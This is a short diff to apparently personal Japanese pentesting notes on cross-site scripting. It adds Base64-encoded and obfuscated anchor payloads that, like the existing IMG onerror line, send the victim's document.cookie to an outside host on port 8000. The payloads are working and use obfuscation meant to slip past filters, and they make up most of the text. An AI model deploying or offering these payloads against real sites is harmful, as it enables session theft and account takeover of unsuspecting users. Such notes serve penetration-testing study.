@@ -18,6 +18,14 @@ https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.ht
 <IMG SRC=/ onerror="eval('fe'+'tch(`http://10.11.146.32:8000/${doc'+'ument.c'+'ookie}`)')"></img>
 ```
 
+```js
+// atob の中は Base64
+<a href=javascript:eval(atob("ZmV0Y2goYGh0dHA6Ly8xOTIuMTY4LjEyOS42MDo4MDAwLyR7ZG9jdW1lbnQuY29va2llfWApOw=="))>test</a>
+
+// 難読化
+<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("ZmV0Y2goYGh0dHA6Ly8xOTIuMTY4LjEyOS42MDo4MDAwLyR7ZG9jdW1lbnQuY29va2llfWApOw=="))>test</a>
+```
+
 ### 画面上の要素を送信
 
 - textarea上に `<script>` が丸々表示される場合は、クローズタグを試す価値がある。
